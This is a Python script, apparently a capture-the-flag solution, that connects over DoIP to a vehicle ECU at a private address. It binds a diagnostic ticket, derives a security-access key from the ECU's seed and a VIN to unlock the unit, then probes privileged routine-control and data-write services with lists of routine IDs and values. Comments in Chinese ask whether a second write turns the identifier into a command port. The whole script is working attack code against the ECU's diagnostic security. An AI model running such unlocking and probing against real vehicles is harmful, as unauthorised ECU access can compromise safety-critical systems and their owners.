import sys, json, hashlib, struct, socket
sys.path.insert(0,"04_SOLVE/uds")
from solve_task04 import hash8, C_DEV
H=lambda t,p: bytes([0x02,0xFD])+struct.pack(">H",t)+struct.pack(">I",len(p))+p
HOST,PORT="10.226.193.2",13400; SA=0x0E00; TA=0xE442
T=json.load(open("work/t5/ticket.json"))["diagnosticTicket"]; VIN=b"CV622697F82A936A1"

def rp(s):
    hdr=b""
    while len(hdr)<8:
        c=s.recv(8-len(hdr))
        if not c: return None
        hdr+=c
    v,i,pt,ln=struct.unpack(">BBHI",hdr); pl=b""
    while len(pl)<ln:
        c=s.recv(ln-len(pl))
        if not c: break
        pl+=c
    return pt,pl

s=socket.socket(); s.settimeout(4); s.connect((HOST,PORT))
s.sendall(H(0x0005,struct.pack(">H",SA)+b"\x00"+b"\x00"*4)); rp(s)
def diag(p,ta=TA):
    s.sendall(H(0x8001,struct.pack(">H",SA)+struct.pack(">H",ta)+p))
    r=rp(s)
    return r[1][4:].hex() if r and r[0]==0x8001 and len(r[1])>=5 else ""

print("1003:",diag(bytes.fromhex("1003")))
print("bind:",diag(bytes.fromhex("2EF1A1")+T.encode()))
sd=diag(bytes.fromhex("2701")); key=hash8(bytes.fromhex(sd[4:]), hashlib.sha256(VIN).digest()[:8], C_DEV)
print("unlock:",diag(bytes.fromhex("2702")+key))
fr=diag(bytes.fromhex("22F1A3")); print("22F1A3:",fr)
fresh=bytes.fromhex(fr[6:]) if fr.startswith("62f1a3") else b"\x00"*8
print("freshness:",fresh.hex(),"len",len(fresh))

print("\n=== A) 31 01 various RID (strict, unlocked) ===")
for rid in [0xF1A3,0xF1A1,0x0001,0x002D,0xAAC9,0xF4E3,0x0100,0x0200,0xFF00,0xE001]:
    print(f"  31 01 {rid:#06x} -> {diag(bytes([0x31,0x01])+struct.pack('>H',rid))}")

print("\n=== B) 31 01 RID + freshness param ===")
for rid in [0xF1A3,0x0001,0xFF00,0x0200]:
    p=bytes([0x31,0x01])+struct.pack(">H",rid)+fresh
    print(f"  31 01 {rid:#06x} +fresh -> {diag(p)}")

print("\n=== C) 写 F1A1 第二次（绑定后再写，是否变成命令口）===")
for label,val in [("same ticket",T.encode()),("zeros8",b"\x00"*8),
                  ("freshness",fresh),("0x2d",b"\x00\x00\x00\x2d")]:
    print(f"  2E F1A1 {label:12s} -> {diag(bytes.fromhex('2EF1A1')+val)}")

print("\n=== D) 0x1000 上 31/2E 复测（解锁后）===")
for ta in [0x1000]:
    for desc,p in [("31 01 FF00",bytes.fromhex("3101FF00")),
                   ("31 01 0001",bytes.fromhex("31010001")),
                   ("2E F1A0 +4B",bytes.fromhex("2EF1A0")+b"\x01\x02\x03\x04")]:
        print(f"  TA={ta:#06x} {desc:12s} -> {diag(p,ta=ta)}")
s.close()
